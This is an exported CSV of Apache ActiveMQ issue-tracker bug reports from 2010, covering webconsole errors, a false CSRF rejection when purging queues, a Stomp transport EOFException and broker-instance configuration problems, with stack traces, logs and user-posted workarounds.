webconsole not working for some 'printable version' links,AMQ-2890,12483460,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,zpg,zpg,31/Aug/10 19:34,05/Dec/12 20:46,14/Jul/23 05:43,05/Dec/12 20:46,,,,,,5.8.0,,,,,,,0,,,,,,,,,"To reproduce: in webconsole, go to 'Queues', select a queue, then click on 'printable version':

javax.el.ELException: java.lang.IllegalArgumentException: No JMSDestination parameter specified
        at javax.el.BeanELResolver.getValue(BeanELResolver.java:298)
        at javax.el.CompositeELResolver.getValue(CompositeELResolver.java:175)
        at com.sun.el.parser.AstValue.getValue(AstValue.java:138)
        at com.sun.el.ValueExpressionImpl.getValue(ValueExpressionImpl.java:206)
        at org.apache.jasper.runtime.PageContextImpl.evaluateExpression(PageContextImpl.java:1001)
        at org.apache.jsp.browse_jsp._jspx_meth_jms_forEachMessage_0(org.apache.jsp.browse_jsp:167)
        at org.apache.jsp.browse_jsp._jspService(org.apache.jsp.browse_jsp:100)
        at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:109)
...
Caused by: java.lang.IllegalArgumentException: No JMSDestination parameter specified
        at org.apache.activemq.web.DestinationFacade.getValidDestination(DestinationFacade.java:109)
        at org.apache.activemq.web.QueueBrowseQuery.getQueue(QueueBrowseQuery.java:65)
        at org.apache.activemq.web.QueueBrowseQuery.createBrowser(QueueBrowseQuery.java:91)
        at org.apache.activemq.web.QueueBrowseQuery.getBrowser(QueueBrowseQuery.java:54)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
",any,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74768,,,Wed Dec 05 20:46:19 UTC 2012,,,,,,,,,,,"0|i0eb5r:",81570,,,,,,,,,,,,,,,,,,,,,"05/Dec/12 20:46;tabish;Tested and seems to be working for all the pages now.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
backoffMultipler getter/setter should be same type to honor getter/setter contract,AMQ-2889,12483451,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,gtully,davsclaus,davsclaus,31/Aug/10 04:20,31/Aug/10 07:31,14/Jul/23 05:43,31/Aug/10 07:31,5.4.0,,,,,5.4.1,,,,,,,0,,,,,,,,,"See AMQ-910 which causes this issue.

And as reported here
http://fusesource.com/forums/thread.jspa?threadID=2198&tstart=0

The proposed patch is to change the getter to be the same type as the setter.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-910,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14821,,,Tue Aug 31 07:31:37 UTC 2010,,,,,,,,,,,"0|i0ba67:",63760,,,,,,,,,,,,,,,,,,,,,"31/Aug/10 07:31;gtully;r991102;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Getting: ""java.lang.UnsupportedOperationException: Possible CSRF attack"" when trying to purge queue",AMQ-2886,12483511,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,cvelo,cvelo,31/Aug/10 02:14,18/Feb/20 21:03,14/Jul/23 05:43,08/Sep/10 20:53,5.3.2,,,,,,,,,,,,0,,,,,,,,,"When trying to purge the contents of any queue, I receive:

HTTP ERROR: 500

Possible CSRF attack
RequestURI=/admin/purgeDestination.action

Caused by:

java.lang.UnsupportedOperationException: Possible CSRF attack
	at org.apache.activemq.web.handler.BindingBeanNameUrlHandlerMapping.getHandlerInternal(BindingBeanNameUrlHandlerMapping.java:58)
	at org.springframework.web.servlet.handler.AbstractHandlerMapping.getHandler(AbstractHandlerMapping.java:184)
	at org.springframework.web.servlet.DispatcherServlet.getHandler(DispatcherServlet.java:1057)
	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:854)
	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:807)
	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:571)
	at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:501)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:693)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:806)
	at org.mortbay.jetty.servlet.ServletHolder.handle(ServletHolder.java:487)
	at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1093)
	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:83)
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76)
	at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1084)
	at org.apache.activemq.web.filter.ApplicationContextFilter.doFilter(ApplicationContextFilter.java:81)
	at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1084)
	at com.opensymphony.module.sitemesh.filter.PageFilter.parsePage(PageFilter.java:118)
	at com.opensymphony.module.sitemesh.filter.PageFilter.doFilter(PageFilter.java:52)
	at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1084)
	at org.mortbay.jetty.servlet.ServletHandler.handle(ServletHandler.java:360)
	at org.mortbay.jetty.security.SecurityHandler.handle(SecurityHandler.java:216)
	at org.mortbay.jetty.servlet.SessionHandler.handle(SessionHandler.java:181)
	at org.mortbay.jetty.handler.ContextHandler.handle(ContextHandler.java:726)
	at org.mortbay.jetty.webapp.WebAppContext.handle(WebAppContext.java:405)
	at org.mortbay.jetty.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:206)
	at org.mortbay.jetty.handler.HandlerCollection.handle(HandlerCollection.java:114)
	at org.mortbay.jetty.handler.HandlerWrapper.handle(HandlerWrapper.java:152)
	at org.mortbay.jetty.Server.handle(Server.java:324)
	at org.mortbay.jetty.HttpConnection.handleRequest(HttpConnection.java:505)
	at org.mortbay.jetty.HttpConnection$RequestHandler.headerComplete(HttpConnection.java:828)
	at org.mortbay.jetty.HttpParser.parseNext(HttpParser.java:514)
	at org.mortbay.jetty.HttpParser.parseAvailable(HttpParser.java:211)
	at org.mortbay.jetty.HttpConnection.handle(HttpConnection.java:380)
	at org.mortbay.io.nio.SelectChannelEndPoint.run(SelectChannelEndPoint.java:395)
	at org.mortbay.thread.BoundedThreadPool$PoolThread.run(BoundedThreadPool.java:450)",Linux 2.6.18-128.1.10.el5.xs5.5.0.51xen #1 SMP Wed Nov 11 07:38:08 EST 2009 i686 i686 i386 GNU/Linux,chines,cvelo,Dech,dslam2000,GTan,irishka,juliano.pezzini,seyffchr,Yohn,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,65588,,,Tue Feb 18 21:03:54 UTC 2020,,,,,,,,,,,"0|i0tslz:",171944,,,,,,,,,,,,,,,,,,,,,"08/Sep/10 20:52;cvelo;This has been resolved with the upgrade to *5.4.0* and can be closed.;;;","08/Sep/10 20:53;cvelo;Fixed with *5.4.0* upgrade.;;;","10/Aug/11 12:58;soupdragon;Looks a lot like the stacktrace I've just seen on 5.5.0, Trying to either purge or delete virtual topic consumer queues when topic still exists.

May need to be re-openned.
;;;","10/Aug/11 13:41;soupdragon;Sorry, I'm putting it down to AMQ-3425 instead.

;;;","27/Jun/14 14:07;irishka;I have the same problem on 5.9.1 :);;;","05/Aug/14 21:30;dslam2000;Still see a warning of this error on 5.9.1;;;","29/Aug/14 08:40;seyffchr;Same problem with 5.10.0 here;;;","02/Dec/14 22:02;GTan;I confirm this problem still exist on 5.9.1. Steps to reproduce:
# Unzip the package, run {{bin\activemq}}
# Open the admin console at {{localhost:8161/admin}} with user/pass admin/admin
# Browse any queue/topic and delete/purge it;;;","21/Apr/15 12:37;Yohn;Hi everyone, I also met this problem days ago, on my Firefox. I googled it and found that if I change the browser to IE, the problem would go away. So I guess that there might be some configuration in Firefox (maybe the Cookie configuration?) forbid the queue creation function, and a check on the browser setting might work. Hope that would help you.;;;","17/Aug/17 14:27;Dech;Hello together.
Yohn, thank you very much! Using IE helped.;;;","14/Aug/19 17:42;chines;This appears to still be an issue with 5.14.5.  

 

We are running an apache proxypass on the same host to provide a pretty name for the admin interface, and this happens when we try to move or copy messages between queues.   Has anyone gotten a solution to this other than change browsers?

 

 ;;;","14/Aug/19 17:59;chines;OK, I stand corrected, this seems to be some weird behavior with open in a new tab.

The workaround that seems to work is to click the refresh on my browser (using Chrome) before I attempt any of the move/copy/delete operations on a message.;;;","18/Feb/20 21:03;juliano.pezzini;Another workaround is to use a anonimous session at Chrome! Works for me!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
EOFException if stomp+nio after ActiveMQ has sent the first bytes message,AMQ-2883,12483468,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,mjustin,mjustin,29/Aug/10 11:21,01/Sep/10 14:25,14/Jul/23 05:43,30/Aug/10 15:48,5.4.0,,,,,5.4.1,,,Transport,,,,0,,,,,,,,,"Starting broker with C:\Java\apache-activemq-5.4.0\bin\activemq-admin.bat start xbean:activemq-stomp.xml

The Stomp client sends a number of binary messages but receives only the first one, the broker log on the console looks like this:

Java Runtime: Sun Microsystems Inc. 1.6.0_07 C:\Program Files\Java\jdk1.6.0_07\j
re
  Heap sizes: current=5056k  free=4360k  max=520256k
    JVM args: -Dcom.sun.management.jmxremote -Xmx512M -Dorg.apache.activemq.UseD
edicatedTaskRunner=true -Djava.util.logging.config.file=logging.properties -Dact
ivemq.classpath=C:\Java\apache-activemq-5.4.0\bin\../conf; -Dactivemq.home=C:\Ja
va\apache-activemq-5.4.0\bin\.. -Dactivemq.base=C:\Java\apache-activemq-5.4.0\bi
n\..
ACTIVEMQ_HOME: C:\Java\apache-activemq-5.4.0\bin\..
ACTIVEMQ_BASE: C:\Java\apache-activemq-5.4.0\bin\..
Loading message broker from: xbean:activemq-stomp.xml
 INFO | PListStore:C:\Java\apache-activemq-5.4.0\bin\..\data\localhost\tmp_stora
ge started
 INFO | Using Persistence Adapter: KahaDBPersistenceAdapter[C:\Java\apache-activ
emq-5.4.0\bin\..\data\kahadb]
 INFO | ActiveMQ 5.4.0 JMS Message Broker (localhost) is starting
 INFO | For help or more information please see: http://activemq.apache.org/
 INFO | Scheduler using directory: activemq-data\scheduler
 INFO | Listening for connections at: stomp://mj-PC:61612?transport.closeAsync=f
alse
 INFO | Connector stomp Started
 INFO | Listening for connections at: stomp+nio://mj-PC:61613?transport.closeAsy
nc=false
 INFO | Connector stomp+nio Started
 INFO | ActiveMQ JMS Message Broker (localhost, ID:mj-PC-49520-1283080154792-0:0
) started
 INFO | Logging to org.slf4j.impl.JCLLoggerAdapter(org.eclipse.jetty.util.log) v
ia org.eclipse.jetty.util.log.Slf4jLog
 INFO | jetty-7.0.1.v20091125
 INFO | ActiveMQ WebConsole initialized.
 INFO | Initializing Spring FrameworkServlet 'dispatcher'
 INFO | ActiveMQ Console at http://0.0.0.0:8161/admin
 INFO | Initializing Spring root WebApplicationContext
 INFO | Connector vm://localhost Started
 INFO | Camel Console at http://0.0.0.0:8161/camel
 INFO | ActiveMQ Web Demos at http://0.0.0.0:8161/demo
 INFO | RESTful file access application at http://0.0.0.0:8161/fileserver
 INFO | Started SelectChannelConnector@0.0.0.0:8161
 INFO | Transport failed: java.io.EOFException
java.io.EOFException
        at org.apache.activemq.transport.stomp.StompNIOTransport.serviceRead(Sto
mpNIOTransport.java:106)
        at org.apache.activemq.transport.stomp.StompNIOTransport.access$000(Stom
pNIOTransport.java:51)
        at org.apache.activemq.transport.stomp.StompNIOTransport$1.onSelect(Stom
pNIOTransport.java:80)
        at org.apache.activemq.transport.nio.SelectorSelection.onSelect(Selector
Selection.java:94)
        at org.apache.activemq.transport.nio.SelectorWorker$1.run(SelectorWorker
.java:119)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExec
utor.java:885)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor
.java:907)
        at java.lang.Thread.run(Thread.java:619)

The Stomp client log is:

TCoreIndyTests.TestBytesMessages
send:
CONNECT



received:
CONNECTED
session:ID:mj-PC-49520-1283080154792-5:0


send:
SUBSCRIBE
destination:/queue/HabariSpeedTest
ack:auto
id:{E4BD9658-B92E-4C57-AD9F-F5357BA66FC2}



send:
SEND
destination:/queue/HabariSpeedTest
content-length:4
correlation-id:{5B735F2D-349E-4A8A-B2AE-6493A1569F88}

☺☻♥1

send:
SEND
destination:/queue/HabariSpeedTest
content-length:4
correlation-id:{5B735F2D-349E-4A8A-B2AE-6493A1569F88}

☺☻♥2

send:

(more messages, ten total)

received:
MESSAGE
message-id:ID:mj-PC-49520-1283080154792-5:0:-1:1:1
destination:/queue/HabariSpeedTest
timestamp:1283080192048
expires:0
subscription:{E4BD9658-B92E-4C57-AD9F-F5357BA66FC2}
content-length:4
priority:0
correlation-id:{5B735F2D-349E-4A8A-B2AE-6493A1569F88}

☺☻♥1

Received 1 messages
Elapsed: 10000 msec (limit: 10000 msec) - giving up
send:
DISCONNECT



Not sure if this is related but I also see an error in the startup log on later restarts. I reinstalled the broker and the message disappears.

 INFO | jetty-7.0.1.v20091125
 INFO | ActiveMQ WebConsole initialized.
 INFO | Initializing Spring FrameworkServlet 'dispatcher'
 INFO | ActiveMQ Console at http://0.0.0.0:8161/admin
 INFO | Initializing Spring root WebApplicationContext
ERROR | Could not accept connection : java.nio.channels.ClosedSelectorException  <------------------
 INFO | Connector vm://localhost Started
 INFO | Camel Console at http://0.0.0.0:8161/camel
 INFO | ActiveMQ Web Demos at http://0.0.0.0:8161/demo
 INFO | RESTful file access application at http://0.0.0.0:8161/fileserver
 INFO | Started SelectChannelConnector@0.0.0.0:8161",Windows Vista,daniel.peters,tpurcell@chariotsolutions.com,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14791,,,Wed Sep 01 14:25:43 UTC 2010,,,,,,,,,,,"0|i0ba7b:",63765,,,,,,,,,,,,,,,,,,,,,"29/Aug/10 19:13;tabish;Would be helpful if you could create a unit test that reproduces this error, take a look at the StompTest.java for some sample to work from.;;;","30/Aug/10 11:38;daniel.peters;I just updated our server from 5.3.2 to 5.4.0 and I get the same error with Stomp:
2010-08-30 12:43:11,681 | INFO  | Transport failed: java.io.EOFException | org.apache.activemq.broker.TransportConnection.Transport | ActiveMQ NIO Worker
java.io.EOFException
        at org.apache.activemq.transport.stomp.StompNIOTransport.serviceRead(StompNIOTransport.java:106)
        at org.apache.activemq.transport.stomp.StompNIOTransport.access$000(StompNIOTransport.java:51)
        at org.apache.activemq.transport.stomp.StompNIOTransport$1.onSelect(StompNIOTransport.java:80)
        at org.apache.activemq.transport.nio.SelectorSelection.onSelect(SelectorSelection.java:94)
        at org.apache.activemq.transport.nio.SelectorWorker$1.run(SelectorWorker.java:119)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
        at java.lang.Thread.run(Thread.java:619)

We had to switch back to 5.3.2 because we have alot stomp clients. :(

It doesnt work without NIO either:
2010-08-30 12:55:15,536 | INFO  | Transport failed: java.io.EOFException | org.apache.activemq.broker.TransportConnection.Transport | ActiveMQ Transport: tcp:///192.168.2.89:37025
java.io.EOFException
        at java.io.DataInputStream.readByte(DataInputStream.java:250)
        at org.apache.activemq.transport.stomp.StompWireFormat.readLine(StompWireFormat.java:146)
        at org.apache.activemq.transport.stomp.StompWireFormat.parseAction(StompWireFormat.java:162)
        at org.apache.activemq.transport.stomp.StompWireFormat.unmarshal(StompWireFormat.java:92)
        at org.apache.activemq.transport.tcp.TcpTransport.readCommand(TcpTransport.java:226)
        at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:218)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:201)
        at java.lang.Thread.run(Thread.java:619)
;;;","30/Aug/10 15:48;tabish;Fixed in trunk.  ;;;","31/Aug/10 14:27;nuvan;Daniel,
We had the same problem and because we have lots of Stomp Clients (a couple of hundred), we implemented a workaround with StompConnect.

Since ActiveMQ 5.4.0 solves a lot of issues (and brings camel 2.4) in 5.3.2 that had impact in our applications we have upgraded our instances use StompConnect instead of somp(+nio) transport connector.
To implement this solution, you just need the StompConnect jar (available at Codehaus) in your class path, and use the following Spring configuration outside of your broker context:

<bean id=""myFactory"" class=""org.apache.activemq.ActiveMQConnectionFactory"">
      <property name=""brokerURL"" value=""tcp://localhost:61616""/
      <property name=""userName"" value=""username""/>
      <property name=""password"" value=""password""/>
</bean>

    
<bean id=""stompConnector"" class=""org.codehaus.stomp.jms.StompConnect"" init-method=""start""> 
      <property name=""connectionFactory"" ref=""myFactory""/> 
      <property name=""uri""               value=""tcp://localhost:61612""/>
</bean>

This way you comment your stomp+nio transport connector and leave the forward to your desired ip/port. (this example assumes a user named ""user"" and password ""password"". Also assumes that your Stomp messages are heading to localhost:61612 and that the openwire transport connector listens in localhost:61616)

Hope this helps. 
Best regards,
Nuno Valente.;;;","01/Sep/10 14:25;daniel.peters;@Timothy:
Thanks for the fast fix! Could you maybe backport this fix to a 5.4 branch? I think alot users that rely on Stomp would appriciate it .

@Nuno:
good idea too, thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
jetty-realm.properties (No such file or directory) when starting new broker instance,AMQ-2882,12483448,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,phil.pickett@springsource.com,phil.pickett@springsource.com,27/Aug/10 20:23,30/Aug/10 13:13,14/Jul/23 05:43,30/Aug/10 13:13,5.4.0,,,,,5.4.1,,,,,,,0,,,,,,,,,"The following exception is seen after creating and starting a new broker instance.  I believe the conf/jetty-real.properties file should be among the files copied from the $ACTIVEMQ_HOME/conf directory to the instance's conf directory.  A patch is attached.

java.io.FileNotFoundException: /home/phil/untouchedAMQ/apache-activemq-5.4.0/BadBroker/conf/jetty-realm.properties (No such file or directory)
	at java.io.FileInputStream.open(Native Method)
	at java.io.FileInputStream.<init>(FileInputStream.java:106)
	at org.eclipse.jetty.util.resource.FileResource.getInputStream(FileResource.java:274)
	at org.eclipse.jetty.security.HashLoginService.loadUsers(HashLoginService.java:145)
	at org.eclipse.jetty.security.MappedLoginService.doStart(MappedLoginService.java:115)
	at org.eclipse.jetty.security.HashLoginService.doStart(HashLoginService.java:186)
	at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:55)
	at org.eclipse.jetty.security.SecurityHandler.doStart(SecurityHandler.java:316)
	at org.eclipse.jetty.security.ConstraintSecurityHandler.doStart(ConstraintSecurityHandler.java:231)
	at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:55)
	at org.eclipse.jetty.server.handler.HandlerCollection.doStart(HandlerCollection.java:165)
	at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:55)
	at org.eclipse.jetty.server.handler.HandlerWrapper.doStart(HandlerWrapper.java:92)
	at org.eclipse.jetty.server.Server.doStart(Server.java:228)
	at org.eclipse.jetty.util.component.AbstractLifeCycle.start(AbstractLifeCycle.java:55)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeCustomInitMethod(AbstractAutowireCapableBeanFactory.java:1536)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1477)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1409)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:519)
	at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:456)
	at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:291)
	at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)
	at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:288)
	at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:190)
	at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:574)
	at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:895)
	at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:425)
	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)
	at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)
	at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:96)
	at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:52)
	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)
	at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)
	at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115)
	at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74)
	at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
	at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:137)
	at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
	at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:83)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
	at java.lang.reflect.Method.invoke(Method.java:597)
	at org.apache.activemq.console.Main.runTaskClass(Main.java:251)
	at org.apache.activemq.console.Main.main(Main.java:107)
",,phil.pickett@springsource.com,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Aug/10 20:24;phil.pickett@springsource.com;CreateCommand.patch;https://issues.apache.org/jira/secure/attachment/12461780/CreateCommand.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14787,,,Mon Aug 30 13:13:55 UTC 2010,,,,,,,Patch Available,,,,"0|i0ba5r:",63758,,,,,,,,,,,,,,,,,,,,,"30/Aug/10 13:13;dejanb;Fixed with svn revision 990793. Thanks for the patch;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
404 status for Broker Instance's admin console - ACTIVEMQ_HOME and ACTIVEMQ_BASE appear not to be set correctly,AMQ-2881,12483458,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,phil.pickett@springsource.com,phil.pickett@springsource.com,27/Aug/10 20:04,31/Aug/10 13:29,14/Jul/23 05:43,31/Aug/10 13:29,5.4.0,,,,,5.4.1,,,,,,,0,,,,,,,,,"In a new AMQ 5.4 installation, I am using a command like ""bin/activemq create Broker2"" to create a new instance.  There are problems bringing up the admin and other consoles for the new instance due to what seem to be problems in the scripts related to $ACTIVEMQ_HOME and $ACTIVEMQ_BASE.

I've been able to get this working by changing references to ${activemq.base} to ${activemq.home} for the webapps in the conf/jetty.xml.  It seems to me that the webapps are probably not instance-specific so I believe this makes sense.  I left the directory set to ${activemq.base} for the jetty-realm.properties file thinking these properties are probably instance-specific.

I also modified the bin/activemq script to set the ACTIVEMQ_CLASSPATH to ""${ACTIVEMQ_BASE}/conf:${ACTIVEMQ_HOME}/conf;${ACTIVEMQ_CLASSPATH}"" so that instance-specific config files are picked up before the more generic config files.

With these changes in place I am able to create multiple broker instances, set unique openwire and jetty ports in the instance's conf/activemq.xml and conf/jetty.xml, start the instances, and open their administrative consoles.

My modified bin/activemq and conf/jetty.xml files are attached along with the differences to the 5.4 version.
",,phil.pickett@springsource.com,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Aug/10 18:05;phil.pickett@springsource.com;AMQ-2881.patch;https://issues.apache.org/jira/secure/attachment/12461782/AMQ-2881.patch","27/Aug/10 20:06;phil.pickett@springsource.com;activemq;https://issues.apache.org/jira/secure/attachment/12461778/activemq","27/Aug/10 20:06;phil.pickett@springsource.com;activemq.diffs;https://issues.apache.org/jira/secure/attachment/12461776/activemq.diffs","27/Aug/10 20:06;phil.pickett@springsource.com;jetty.xml;https://issues.apache.org/jira/secure/attachment/12461779/jetty.xml","27/Aug/10 20:06;phil.pickett@springsource.com;jetty.xml.diffs;https://issues.apache.org/jira/secure/attachment/12461777/jetty.xml.diffs",,,,,,,,,,,,,,,,,5.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14798,,,Tue Aug 31 13:29:30 UTC 2010,,,,,,,Patch Available,,,,"0|i0ba73:",63764,,,,,,,,,,,,,,,,,,,,,"30/Aug/10 18:05;phil.pickett@springsource.com;Attaching patch for bin/activemq, bin/activemq.bat, and conf/jetty.xml;;;","31/Aug/10 13:29;dejanb;A bit modified patch committed with svn revision 991184. Thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
